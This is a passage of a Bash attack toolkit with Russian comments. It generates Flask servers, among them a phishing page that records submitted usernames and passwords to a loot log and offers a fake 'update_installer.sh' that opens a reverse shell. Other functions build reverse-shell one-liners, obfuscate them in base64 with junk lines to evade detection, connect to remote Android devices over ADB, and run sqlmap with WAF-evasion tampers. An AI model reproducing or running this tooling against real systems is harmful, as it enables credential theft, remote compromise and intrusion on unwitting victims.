        scan_output = res.stdout if res.stdout else res.stderr
        if not scan_output and res.returncode == 0:
            scan_output = f"{f.filename}: OK"
    except Exception as e:
        scan_output = f"SYSTEM_ERROR: {str(e)}"
    finally:
        if os.path.exists(tmp_path): os.remove(tmp_path)

    is_infected = "FOUND" in scan_output or "Infected" in scan_output
    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_VERIFIED"
    status_class = "infected" if is_infected else "clean"

    content = f"""
    <div class="status-box {status_class}">{status_msg}</div>
    <pre>{{{{ output }}}}</pre>
    <a href="/" class="btn">[ RETURN ]</a>
    """
    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)

if __name__ == '__main__':
    # В режиме Live/Memory SSL сертификаты (файлы) опциональны. 
    # Запускаем чистый HTTP для максимальной скорости на Wiko.
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
}


# Функция-генератор для Share-Server (v1.0)
# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
generate_share_server_code_raw() {
    # Загружаем только базовый шаблон страницы
    local template=$(generate_core_template)

    cat << EOF
from flask import Flask, render_template_string, send_from_directory
import os

app = Flask(__name__)
SHARE_DIR = '/root/share'

if not os.path.exists(SHARE_DIR):
    os.makedirs(SHARE_DIR, exist_ok=True)

$template

def get_file_icon(filename):
    """Определяет иконку в зависимости от расширения файла."""
    ext = filename.split('.')[-1].lower() if '.' in filename else ''
    icons = {
        'pdf': '📕',
        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
    }
    return icons.get(ext, '📄')

@app.route('/')
def index():
    try:
        files = sorted(os.listdir(SHARE_DIR))
    except:
        files = []
    
    # Формируем сетку файлов с использованием новых стилей .file-grid и .file-item
    grid_content = '<div class="file-grid">'
    for f in files:
        icon = get_file_icon(f)
        grid_content += f"""
        <a href="/get/{f}" class="file-item" target="_blank">
            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
        </a>
        """
    
    if not files:
        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
    
    grid_content += '</div>'
    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'

    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION", grid_content))

@app.route('/get/<filename>')
def get_file(filename):
    return send_from_directory(SHARE_DIR, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=False)
EOF
}


# Функция-генератор для Upload-Server (v1.0)
generate_upload_server_code_raw() {
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    cat << EOF
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
# Сохраняем во входящую папку внутри PRIME_LOOT
UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR, exist_ok=True)

$templates

@app.route('/')
def index():
    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE UPLOAD")
    return render_template_string(render_prime_page("INBOUND_DROP_BOX", form_html))

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "TRANSFER_ERROR", 400
    f = request.files['file']
    if f.filename == '': return "EMPTY_FILENAME", 400
    
    f.save(os.path.join(UPLOAD_DIR, f.filename))
    return "SUCCESS: File received in secure sector."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF
}




generate_phantom_server_code() {
    local target_file="$1"
    local mode="$2"
    local layout=$(generate_core_template)

    cat << EOF > "$target_file"
from flask import Flask, request, render_template_string, send_from_directory
import os

app = Flask(__name__)
LOOT = "$LOOT_DIR/phantom_loot.log"

$layout

@app.route('/')
def index():
    content = """
    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
    <form method='post' action='/auth'>
        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
        <button type='submit'>VERIFY & RECOVER</button>
    </form>
    """
    if "$mode" != "creds":
        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
    
    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))

@app.route('/auth', methods=['POST'])
def auth():
    with open(LOOT, "a") as f:
        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))

@app.route('/download')
def download():
    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
}



# ==========================================
# 2. РАБОЧИЕ ФУНКЦИИ (Используют ядро)
# ==========================================


run_system_pulse() {
    # Слой 1: Заголовок и статус через Голос [1]
    core_engine_ui "SECTOR Z: LIVE SYSTEM PULSE"
    core_engine_ui "Monitoring filesystem events and net-connections..."
    
    # Слой 2: Сетевые соединения
    # Используем узел [12] для акцента на NET
    echo -e "${Y}[NETWORK CONNECTIONS]:${NC}"
    # Очищаем вывод через sed, сохраняя твой фильтр
    ss -tunp | grep -v "127.0.0.1" | head -n 10 | sed 's/^/  /'
    
    # Слой 3: Визуальный разделитель [9]
    core_engine_wait "L" # Рисуем линию
    
    # Слой 4: Живой мониторинг
    core_engine_ui "w" "Watching file activity (Ctrl+C to stop)"
    
    # Используем переменную из нашей структуры (PRIME_LOOT -> из конфига или локальная)
    local loot_path="${BASE_DIR:-./}/prime_loot"
    
    # Запускаем мониторинг
    watch -n 2 "ls -lt /tmp $loot_path 2>/dev/null | head -n 15"
}



# Вспомогательные функции-мостики (для чистоты кода)
pc_gen_payload() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PAYLOAD GENERATOR"

    # Слой 2: Автоматическое определение LHOST (без ifconfig/awk)
    # Используем логику из узла [12] для получения активного IP
    local l_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' || echo "127.0.0.1")
    
    echo -e "${Y}Detected LHOST:${NC} $l_ip"

    # Слой 3: Защищенный ввод порта через Органы чувств [3] и Мозг [5]
    local l_port=$(core_engine_input "select" "Enter LPORT (Default: 4444)")
    [[ -z "$l_port" ]] && l_port="4444"

    # Слой 4: Синхронизация через узел [13]
    core_engine_progress 3 "COMPILING REVERSE SHELL"

    # Слой 5: Вывод результата (Стерильный поток)
    echo -e "\n${G}RAW BASH:${NC}"
    # Мутируем только ключевые слова для обхода простейших фильтров через узел [4]
    local cmd="bash -i >& /dev/tcp/$l_ip/$l_port 0>&1"
    echo -e "${W}$cmd${NC}\n"

    # Финализация через Барьер [9]
    core_engine_wait
}

# Редиректы на существующие модули, чтобы не дублировать код
pc_steal_creds() { run_pc_recovery_ultimate; }
pc_post_exploit() { run_forensic_scanner; }



# --- Модули по меню ---

run_forensic_scanner() {
    core_engine_ui "AUTONOMOUS DEFENSE & REMEDIATION"
    
    # 1. Транспорт (Выбор цели)
    core_engine_item "L" "Local" "Current Device"
    core_engine_item "A" "Android/IoT" "via ADB/USB"
    core_engine_item "S" "Remote Server" "via SSH/IP"
    core_engine_item "B" "Back" "Exit scanner"
    
    local target=$(core_engine_input "select" "Select Target")
    [[ "$target" == "b" || -z "$target" ]] && return
    
    local cmd_p=""
    case "$target" in
        "a")
            core_engine_validator "pkg" "adb" "ADB" || return
            core_engine_ui "Waiting for device..."
            adb wait-for-device
            cmd_p="adb shell " ;;
        "s")
            local rh=$(core_engine_input "text" "Enter Remote User@IP")
            [[ -z "$rh" ]] && return
            cmd_p="ssh $rh " ;;
    esac

    core_engine_progress 5 "ENGAGING AUTONOMOUS PURGE"

    # --- ФАЗА 1: НЕЙТРАЛИЗАЦИЯ ПРОЦЕССОВ ---
    core_engine_ui "!" "Phase 1: Process Neutralization..."
    local bad_procs=$($cmd_p "ps -eo pid,stat | grep -E '[ZDe]' | tr -s ' ' | cut -d' ' -f2")
    
    if [[ -n "$bad_procs" ]]; then
        for pid in $bad_procs; do
            core_engine_ui "w" "Autonomous Kill: PID $pid"
            $cmd_p "kill -9 $pid" 2>/dev/null
        done
        core_engine_ui "+" "Suspicious processes neutralized."
    else
        core_engine_ui "+" "Process tree secure."
    fi

    # --- ФАЗА 2: ИЗОЛЯЦИЯ ПОРТОВ ---
    core_engine_ui "!" "Phase 2: Shadow Port Isolation..."
    local blacklisted="4444 5555 6666 7777 8888 9999"
    local ports=$($cmd_p "netstat -ant | grep LISTEN | tr -s ' ' | cut -d' ' -f4 | cut -d: -f2")

    for port in $ports; do
        for bl in $blacklisted; do
            [[ "$port" == "$bl" ]] && {
                core_engine_ui "w" "Auto-Blocking DANGER Port: $port"
                $cmd_p "iptables -A INPUT -p tcp --dport $port -j DROP" 2>/dev/null
                $cmd_p "fuser -k -n tcp $port" 2>/dev/null
            }
        done
    done

    # --- ФАЗА 3: КАРАНТИН ФАЙЛОВ ---
    core_engine_ui "!" "Phase 3: Automated File Quarantine..."
    local s_path="/etc /usr/bin /tmp"
    [[ "$target" == "a" ]] && s_path="/data/local/tmp /system/bin /cache"
    
    local suspect=$($cmd_p "find $s_path -mtime -1 -type f 2>/dev/null")

    if [[ -n "$suspect" ]]; then
        $cmd_p "mkdir -p /root/quarantine_vault" 2>/dev/null
        for file in $suspect; do
            local fname=$(basename "$file")
            core_engine_ui "w" "Isolating: $file"
            $cmd_p "mv $file /root/quarantine_vault/${fname}.dead && chmod 000 /root/quarantine_vault/${fname}.dead"
        done
        core_engine_ui "+" "Files relocated to /root/quarantine_vault/"
    else
        core_engine_ui "+" "File system integrity: SECURE."
    fi

    core_engine_ui "+" "Target sanitized. State: PROTECTED."
    core_engine_wait
}

run_ghost_commander() {
    core_engine_ui "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация ADB через Мозг [5]
    if ! core_engine_validator "pkg" "adb" "ADB Engine"; then
        core_engine_ui "e" "ADB not found. Initializing lightweight bridge..."
        core_engine_run "apt-get update && apt-get install android-sdk-platform-tools-common -y"
    fi

    # 2. Органы чувств [3]: Запрос цели
    local t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Scan)")

    # 3. Режим сканирования (через Глушитель [7])
    if [[ -z "$t_ip" ]]; then
        core_engine_ui "Scanning local network for ADB signatures..."
        local subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
        
        # Скан через nmap (если есть) или быстрый вывод
        nmap -p 5555 --open "$subnet.0/24" -n -Pn 2>/dev/null | grep "Nmap scan report" | cut -d' ' -f5
        core_engine_wait && return
    fi

    # 4. Проверка связи (Слой 2: Таймаут)
    core_engine_ui "Initializing ghost bridge to $t_ip:5555..."
    
    if ! timeout 2 bash -c "</dev/tcp/$t_ip/5555" 2>/dev/null; then
        core_engine_ui "w" "Target $t_ip:5555 seems offline."
        # Подтверждение через валидатор [5]
        core_engine_validator "read" "Force ghost-connect attempt?" || return
    fi

    # 5. Исполнение и Сбор трофеев [11]
    core_engine_ui "+" "Executing Ghost-Protocol to $t_ip..."
    core_engine_loot "ghost" "Session established: $t_ip"
    
    # Прямое подключение и вход в оболочку
    adb connect "$t_ip:5555" >/dev/null
    core_engine_ui "Dropping into Ghost Shell..."
    adb -s "$t_ip:5555" shell
    
    # 6. Стелс-финализация (Отключение без следов)
    adb disconnect "$t_ip:5555" >/dev/null 2>&1
    core_engine_wait
}




# --- [ SYSTEM UPDATE ENGINE v35.4 ] ---

run_update_prime() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "SYSTEM UPDATE & SYNC"
    
    local target="/root/launcher.sh"
    local repo="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
    local tmp="${target}.tmp"

    core_engine_ui "Connecting to GitHub..."

    # Слой 2: Безопасная загрузка через Глушитель [7]
    core_engine_run "curl -s -L $repo -o $tmp" "Fetching Repository Source"
    
    # Слой 3: Валидация данных через Мозг [5]
    # Проверяем существование и размер файла
    if ! core_engine_validator "file" "$tmp" "Repository Source"; then
        core_engine_remove "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 4: КРИТИЧЕСКИЙ ФИЛЬТР (Защита синтаксиса)
    # Проверка Bash-синтаксиса перед заменой живого ядра
    if ! bash -n "$tmp" 2>/dev/null; then
        core_engine_ui "e" "CRITICAL: Remote code is corrupted!"
        core_engine_remove "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 5: Атомарная замена и права через Санитара [8]
    core_engine_run "mv $tmp $target && chmod 755 $target && chown root:root $target 2>/dev/null" "Applying Atomic Update"

    # Слой 6: Восстановление среды (Alias & Symlink)
    if ! grep -q "alias launcher=" ~/.bashrc; then
        echo "alias launcher='bash $target'" >> ~/.bashrc
        core_engine_ui "y" "Alias 'launcher' restored in .bashrc"
    fi
    
    # Создаем системную ссылку через Глушитель
    core_engine_run "ln -sf $target /usr/local/bin/launcher && chmod +x /usr/local/bin/launcher" "Updating System Path"

    core_engine_ui "+" "Code updated, permissions set, alias active!"
    
    # Слой 7: Синхронизация и перезапуск [13]
    core_engine_progress 1 "System rebooting"
    
    # Полная очистка перед перезапуском [10]
    core_engine_clean_env
    
    # Мгновенная передача управления новому коду
    exec bash "$target"
}



# --- ENGINE: DYNAMIC POLYMORPHISM (ZERO-FOOTPRINT) ---

generate_poly_payload() {
    core_engine_ui "h" "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
    
    # Слой 1: Ввод данных через стандартные Органы Чувств [3]
    local lhost=$(core_engine_input "text" "Enter local IP for Listener")
    [[ -z "$lhost" ]] && return
    
    local lport=$(core_engine_input "text" "Enter local Port")
    [[ -z "$lport" ]] && return

    local raw_payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    local output_file="$PRIME_LOOT/ghost_payload_$RANDOM.sh"

    # Слой 2: Визуализация процесса через новый прогресс-бар (В ОДНУ СТРОКУ)
    core_engine_progress 1 "POLYMORPH_ENGINE_INIT"

    # 1. Генерируем случайный ключ обфускации
    local key=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)
    
    # 2. Создаем "Мусорный код" для изменения хеш-суммы
    local junk="# $(date +%s) | $(tr -dc 'a-z' < /dev/urandom | head -c 32)"

    # 3. Применяем Base64 (динамическая обфускация)
    local encoded=$(echo -n "$raw_payload" | base64 | tr -d '\n')
    
    # Сборка финального стелс-файла
    {
        echo "#!/bin/bash"
        echo "$junk"
        echo "K=\"$key\""
        echo "echo \"$encoded\" | base64 -d | bash"
    } > "$output_file"

    chmod +x "$output_file"

    # Слой 3: Финальный отчет без мусора
    core_engine_ui "line" ""
    core_engine_ui "s" "Polymorphic Payload Secured"
    echo -e "${B}Path:${NC} $output_file"
    echo -e "${Y}Signature:${NC} $(sha256sum "$output_file" | awk '{print $1}')"
    core_engine_ui "line" ""
    
    # Регистрация артефакта в Сборщике трофеев [11]
    core_engine_loot "payload" "Generated poly-payload for $lhost:$lport"

    # Один финальный wait, чтобы пользователь успел скопировать путь
    core_engine_wait
}


run_system_info() {
    core_engine_ui "h" "PRIME INTELLIGENCE & RECON v2.5"

    core_engine_item "1" "LOCAL" "System, USB, Cron & Webhooks"
    core_engine_item "2" "REMOTE" "Deep Recon & Webhook Discovery"
    core_engine_item "B" "BACK" "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Target Type")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1") # --- LOCAL ---
            core_engine_ui "i" "Analyzing Local Services..."
            
            # Проверка локальных слушателей (кто может принимать вебхуки)
            local listeners=$(lsof -nP -iTCP -sTCP:LISTEN | grep -E "python|node|php" || echo "No local web-listeners active.")
            
            echo -e "\n${Y}--- LOCAL EVENT LISTENERS ---${NC}"
            echo -e "${W}$listeners${NC}"
            ;;

        "2") # --- REMOTE ---
            core_engine_validator "pkg" "curl" "curl" || return
            
            local r_target=$(core_engine_input "text" "Enter Target (domain.com)")
            [[ -z "$r_target" ]] && return

            core_engine_ui "w" "Executing Multi-Vector Reconnaissance..."
            core_engine_progress 2 "SCANNING_RESOURCES"

            # 1. Сбор базовых данных
            local headers=$(curl -Is --connect-timeout 5 -L "$r_target" 2>/dev/null)
            local php_ver=$(echo "$headers" | grep -Ei "X-Powered-By" | cut -d' ' -f2- | tr -d '\r')
            
            # 2. ПОИСК WEBHOOKS & API (Fuzzing)
            core_engine_ui "i" "Probing for Webhook & API endpoints..."
            local webhook_hits=""
            # Список эндпоинтов, которые часто остаются открытыми
            local hooks=("webhook" "webhooks" "api/v1" "api/v2" "hooks" "tg-hook.php" "stripe-webhook" "git-hook")
            
            for hook in "${hooks[@]}"; do
                local code=$(curl -o /dev/null -s -w "%{http_code}" --connect-timeout 2 "http://$r_target/$hook")
                if [[ "$code" == "200" || "$code" == "405" || "$code" == "401" ]]; then
                    # 405 (Method Not Allowed) часто означает, что хук ждет POST запрос — это "живая" цель!
                    webhook_hits+="${G}[!] DETECTED:${NC} /$hook (Status: $code)\n"
                fi
            done
            
            # 3. WHOIS & IP
            local target_ip=$(host "$r_target" 2>/dev/null | awk '/has address/ {print $4}' | head -n1)

            # --- ВЫВОД ---
            echo -e "\n${Y}--- REMOTE INTELLIGENCE REPORT ---${NC}"
            echo -e "${B}Target IP:${NC} $target_ip"
            echo -e "${B}Runtime:${NC}   ${G}${php_ver:-Unknown}${NC}"
            
            echo -e "\n${B}Webhook & API Surface:${NC}"
            if [[ -n "$webhook_hits" ]]; then
                echo -e "$webhook_hits"
                echo -e "${Y}[*] Analysis:${NC} Active listeners found. Possible third-party integration detected."
            else
                echo -e "${R}No common webhook endpoints detected.${NC}"
            fi
            
            core_engine_loot "recon" "Webhook scan for $r_target finished."
            ;;
    esac

    core_engine_ui "+" "Diagnostic complete."
    core_engine_wait
}



# --- Анализ Bluetooth устройств ---
run_bluetooth_scan() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "BLUETOOTH RADAR"
    
    # 2. Проверка инструментов через Мозг [5]
    if ! core_engine_validator "pkg" "bluez" "Bluetooth Engine"; then
        if [[ $(id -u) -eq 0 ]]; then
            core_engine_ui "w" "Root detected. Deploying 'bluez' core..."
            core_engine_run "apt-get update && apt-get install bluez -y" "Installing bluez"
        else
            core_engine_ui "!" "Non-Root environment (Samsung A14?)."
            core_engine_ui "i" "Manual action: apt update && apt install bluez"
            core_engine_wait && return
        fi
    fi

    # 3. Активация интерфейса (только для Root/Wiko) [5]
    if [[ $(id -u) -eq 0 ]]; then
        core_engine_ui "Activating Bluetooth Interface..."
        hciconfig hci0 up >/dev/null 2>&1
    fi

    # 4. Визуализация процесса через Синхронизацию [13]
    core_engine_ui "Initializing BlueZ Stack..."
    core_engine_progress 3 "SCANNING PROXIMITY SPECTRUM"
    
    core_engine_ui "!" "Searching for active signals..."
    
    # 5. Исполнение через Глушитель [7]
    local scan_out
    scan_out=$(hcitool scan 2>/dev/null)

    if [[ -z "$scan_out" || "$scan_out" == *"Scanning"* ]]; then
        core_engine_ui "e" "No devices found or Adapter blocked."
        
        # Эвристическая подсказка (Samsung A14 / Non-Root)
        [[ $(id -u) -ne 0 ]] && core_engine_ui "w" "Note: Direct BT access restricted on Non-Root."
    else
        # Чистый вывод без заголовка "Scanning..."
        echo -e "$scan_out" | grep -v "Scanning"
        core_engine_ui "+" "Scan completed."
        
        # 6. Сбор трофеев через узел [11]
        core_engine_loot "bluetooth" "BT Scan Results:\n$scan_out"
    fi
    
    core_engine_wait
}


# --- Глубокий аудит системы ---
run_deep_audit() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "SMART SYSTEM AUDIT"
    core_engine_ui "i" "Analyzing local environment for misconfigurations..."
    
    # Слой 2: Визуализация через Синхронизацию [13]
    core_engine_progress 4 "EXAMINING SYSTEM VULNERABILITIES"
    
    # Слой 3: Поиск SUID-бинарников (потенциальные векторы LPE)
    core_engine_ui "!" "Checking SUID binaries..."
    # Используем Глушитель [7] для выполнения тяжелых поисков
    local suid_files=$(find / -perm -4000 -type f 2>/dev/null | head -n 5)
    echo -e "${W}${suid_files:-No critical SUID found}${NC}"
    
    # Слой 4: Поиск файлов с правами на запись для всех (World-Writable)
    core_engine_ui "!" "Checking World-Writable files..."
    local writable_files=$(find / -writable -type f 2>/dev/null | head -n 5)
    echo -e "${W}${writable_files:-No world-writable files found}${NC}"
    
    # Слой 5: Сбор трофеев через узел [11]
    local audit_data="SUID Scan:\n$suid_files\n\nWritable Scan:\n$writable_files"
    core_engine_loot "audit" "$audit_data"
    
    core_engine_ui "+" "Audit Complete. Results secured."
    
    # Финализация через Барьер [9]
    core_engine_wait
}


# --- Сетевое мапирование (Network Mapper) ---

run_network_analyzer() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "NETWORK INTELLIGENCE & TOPOLOGY"

    # 2. Выбор режима через Архитектора [2] и Органы чувств [3]
    core_engine_item "1" "Network Mapping" "Hybrid Scan"
    core_engine_item "2" "Traffic Analysis" "TShark Core"
    core_engine_item "3" "Full Intel Loop" "Mapping + Sniffing"
    core_engine_item "B" "Back" "Return"
    
    local choice=$(core_engine_input "select" "SELECT OPERATION MODE")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    # 3. Логика Mapping (пункты 1 и 3)
    if [[ "$choice" == "1" || "$choice" == "3" ]]; then
        # Эвристика подсети через узел Метрик [12]
        local def_range=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)".0/24"
        
        local range=$(core_engine_input "text" "Enter Target Range (Default: $def_range)")
        range="${range:-$def_range}"
        
        core_engine_progress 2 "MAPPING TOPOLOGY"

        # Гибридный движок (адаптация под Root/Samsung A14) через Валидатор [5]
        local nmap_cmd="nmap -sn -n -T4"
        if [[ $(id -u) -ne 0 ]]; then
            # Режим Non-Root (Termux/Samsung)
            nmap_cmd+=" --unprivileged --send-ip"
        fi
        
        # Исполнение через Глушитель [7] с очисткой вывода
        core_engine_ui "!" "Scanning range: $range"
        $nmap_cmd "$range" 2>/dev/null | grep "Nmap scan report" | awk '{print $5 " -> [ONLINE]"}' | sort -u
        
        [[ "$choice" == "1" ]] && { core_engine_wait; return; }
    fi

    # 4. Логика Sniffing (пункты 2 и 3)
    if [[ "$choice" == "2" || "$choice" == "3" ]]; then
        core_engine_ui "i" "Initializing TShark Core..."
        
        # Проверка TShark через Мозг [5]
        if ! core_engine_validator "pkg" "tshark" "Traffic Analyzer"; then
             core_engine_ui "e" "TShark not found. Run 'apt install tshark'."
             core_engine_wait && return
        fi

        # Предупреждение о правах
        [[ $(id -u) -ne 0 ]] && core_engine_ui "w" "Non-root: Traffic capture may be limited."

        # Подключение к твоему динамическому контроллеру
        local n_names="Live_Host_Monitor Deep_Packet_Inspection"
        local n_funcs="run_network_intelligence run_packet_dump"
        
        # Вызываем твой сохраненный контроллер
        prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
    fi
}


run_phantom_engine() {
    clear
    core_engine_ui "h" "PRIME PHANTOM FRAMEWORK"

    # Используем системные переменные ядра
    local local_ip=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
    local my_host="${HOSTNAME:-localhost}"
    local srv_path="/tmp/phantom_srv.py" # Перенесли в /tmp для стерильности
    local payload_name="update_installer.sh"
    local payload_path="$PRIME_LOOT/$payload_name"

    # Выбор стратегии через компактный ввод
    core_engine_ui "i" "Select Attack Strategy:"
    echo -e " 1) Credential Capture"
    echo -e " 2) Full Hybrid (Creds + Payload)"
    echo -e " 3) Cancel"
    
    local choice=$(core_engine_input "select" "Strategy")
    [[ "$choice" == "3" || -z "$choice" ]] && return

    local attack_type="creds"
    [[ "$choice" == "2" ]] && attack_type="hybrid"

    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ЛЕСТНИЦЫ) ---
    core_engine_progress 1 "FORGING_PAYLOAD"
    
    # Создаем Payload
    cat <<EOF > "$payload_path"
#!/bin/bash
# System update for $my_host
echo 'Updating system components...'
bash -i >& /dev/tcp/$local_ip/4444 0>&1 &
EOF
    chmod +x "$payload_path"

    # --- ФАЗА АКТИВАЦИИ ---
    if command -v python3 >/dev/null; then
        # Генерируем код сервера (предполагаем, что функция существует)
        generate_phantom_server_code "$srv_path" "$attack_type" 2>/dev/null
        
        core_engine_ui "w" "Activating Phantom Gate on port 80..."
        # Тихая очистка порта
        fuser -k 80/tcp >/dev/null 2>&1
        
        # Запуск в фоне
        python3 "$srv_path" > /dev/null 2>&1 &
        
        core_engine_ui "s" "PHANTOM GATEWAY OPERATIONAL"
        
        # Информационная панель
        core_engine_ui "line" ""
        echo -e "${Y}--- Gateway Info ---${NC}"
        echo -e "${G} >> URL:${NC}      http://${local_ip}"
        echo -e "${G} >> Payload:${NC}  /${payload_name}"
        echo -e "${G} >> Strategy:${NC} ${attack_type}"
        core_engine_ui "line" ""
        
        # Фиксация в трофеях
        core_engine_loot "phantom" "Gateway active at http://$local_ip ($attack_type)"
    else
        core_engine_ui "e" "Python3 missing. Operation aborted."
    fi

    # Финальное ожидание (вместо pause)
    core_engine_wait
}


run_sql_adaptive() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5"

    # Слой 2: Органы чувств [3] - Запрос цели
    local target_url=$(core_engine_input "text" "Enter Target URL")
    [[ -z "$target_url" ]] && return

    # Слой 3: Эвристика и анализ WAF через Глушитель [7]
    core_engine_ui "i" "Probing WAF/IPS resistance layers..."
    local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "$target_url%27%20OR%201=1")
    
    # Слой 4: НЕЙРОННАЯ МУТАЦИЯ через узел [4]
    # Используем системный мутатор для генерации уникального агента
    local neural_agent="Prime-$(core_engine_mutate "agent" "neural")-$RANDOM"
    core_engine_ui "+" "Neural Header Generated: $neural_agent"

    # Слой 5: Адаптивное вычисление агрессии (Мозг [5])
    local aggr=$(( (waf_reaction / 100) ))
    [[ $aggr -lt 2 ]] && aggr=2 

    # Матрица тамперов (интегрирована в логику)
    local t_matrix
    case "$aggr" in
        2) t_matrix="between,randomcase" ;;
        4) t_matrix="between,charencode,space2comment,versionedmorekeywords" ;;
        *) t_matrix="between,charencode,space2comment,randomcase,percentage" ;;
    esac

    core_engine_ui "+" "Applying Neural Obfuscation: $t_matrix"

    # Слой 6: Исполнение и Сбор трофеев [11]
    # Используем временную директорию внутри структуры PRIME_LOOT
    local out_dir="${BASE_DIR:-./}/prime_loot/mutagen_$RANDOM"
    
    core_engine_ui "i" "Launching evolved payload stream..."
    
    # Запуск в фоне с подавлением мусора через Глушитель
    {
        sqlmap -u "$target_url" --batch --random-agent --user-agent="$neural_agent" \
        --smart --mobile --output-dir="$out_dir" --flush-session \
        --tamper="$t_matrix" --level=$aggr --risk=2 \
        --delay=$((aggr / 2)) --threads=1 >/dev/null 2>&1
    } &

    # Визуализация через Синхронизацию [13]
    core_engine_progress 15 "Neural-Evolving payload mutations"

    # Слой 7: Интеллектуальный синтез и логирование [11]
    local log_file=$(find "$out_dir" -name "log" 2>/dev/null)
    if [[ -f "$log_file" ]]; then
        core_engine_ui "+" "EXPLOIT SECURED: Findings integrated."
        
        # Структурированная запись в лут через Сборщик
        local findings=$(grep -Ei "Type:|Payload:|Parameter:" "$log_file")
        core_engine_loot "sql_success" "TARGET: $target_url\nAGGR: $aggr\n$findings"
    fi

    # Сигнал для моста [10]
    echo "[$(date)] SRC: $target_url | AGGR: $aggr" >> "${BASE_DIR:-./}/prime_loot/bridge_signals.log"
    
    # Очистка через Санитара [8]
    core_engine_remove "$out_dir"
    core_engine_wait
}


run_network_intelligence() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "NETWORK INTELLIGENCE: TRAFFIC ANALYZER"
    
    # Слой 2: Проверка TShark через Мозг [5]
    core_engine_validator "pkg" "tshark" "TShark Core" || { core_engine_wait; return; }

    # Слой 3: Авто-определение интерфейса через Метрики [12]
    local iface=$(ip route | grep default | grep -oP 'dev \K\S+' || echo "eth0")
    core_engine_ui "i" "Active interface detected: $iface"

    # Слой 4: Выбор режима через Архитектора [2] и Органы чувств [3]
    core_engine_item "1" "Host Monitor" "IP Connections"
    core_engine_item "2" "Data Sniffer" "Live Leads"
    core_engine_item "3" "Traffic Record" "PCAP Archive"
    core_engine_item "B" "Back" "Return"

    local choice=$(core_engine_input "select" "Select Surveillance Mode")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1") # --- Host Monitor ---
            core_engine_ui "i" "Monitoring Live Connections on $iface (Ctrl+C to stop)"
            # Вывод через Глушитель [7] с потоковой очисткой
